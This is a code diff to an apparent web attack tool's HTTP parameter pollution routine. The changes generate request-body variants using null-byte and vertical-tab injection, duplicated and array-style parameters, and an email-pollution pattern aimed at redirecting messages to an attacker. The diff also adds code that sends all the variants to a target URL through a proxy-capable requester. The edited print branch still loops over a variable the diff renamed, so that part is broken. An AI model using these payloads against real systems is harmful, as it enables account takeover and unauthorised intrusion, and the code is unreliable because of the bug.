@@ -267,8 +267,7 @@ class Main:
 
         else:
             query_params = copy.deepcopy(parse_qs(self.Data))
-            value = query_params.get(self.Name, [None])
-
+            value = query_params.get(self.Name, [None])[0]
 
             #name=value[with VT Vector]name=attacker;s
             for xx in char:
@@ -276,9 +275,33 @@ class Main:
                 new_query_string = urlencode(query_params, doseq=True)
                 Payed.append(unquote(new_query_string)) 
 
-        return Payed       
+                #Peram%00anything=value 
+                Payed.append(self.Data.replace(f"{self.Name}={value}", f"{self.Name}{xx}{self.PAY}={value}"))
+                
+                #email[VT]=attacker@mail.com[VT]alaminhossyin@gmail.com
+                Payed.append(self.Data.replace(f"{self.Name}=", f"{self.Name}{xx}={self.PAY}{xx}"))
 
+            #name=one&name[]=two as array
+            for xx1 in char:
+                if self.Name in query_params:
+                    query_params[self.Name] = f"{value}&{self.Name}{xx1}={self.PAY}"
+                    new_query_string = urlencode(query_params, doseq=True)
+                    Payed.append(unquote(new_query_string))
+            
+            #name[]=one&name=two
+            for xx2 in char:
+                Peramed = f"{self.Name}{xx2}={self.PAY}&"
+                pattern = rf"{self.Name}"
+                new_text = re.sub(pattern, Peramed + pattern, self.Data)
+                Payed.append(f"{new_text}")
+            
+            #name[]=one&name[]=
+            for xx3 in char:
+                Peramed = f"{self.Name}{xx3}={value}&{self.Name}{xx3}={self.PAY}"
+                new_text = re.sub(rf"{self.Name}={value}", Peramed, unquote(self.Data), flags=re.IGNORECASE)
+                Payed.append(new_text)
 
+        return Payed
 
     
     async def Remove_Cookie(self):  #ONE By One!
@@ -357,6 +380,12 @@ class Main:
                             await task
 
                 except json.JSONDecodeError:
-                    result = await self.HPP()
-                    for x in result:
-                        print(x)
+                    Payed = await self.HPP()
+                    if self.Print:
+                        for x in result:
+                            print(x)
+                    else:
+                        semaphore = asyncio.Semaphore(1)  
+                        tasks = [asyncio.create_task(requester.Main(Url=self.Url, Method=self.Method, Data=d,Semaphore=semaphore, Proxy=self.Proxy, Headers=self.Headers)) for d in list(set(Payed))]
+                        for task in asyncio.as_completed(tasks):
+                            await task
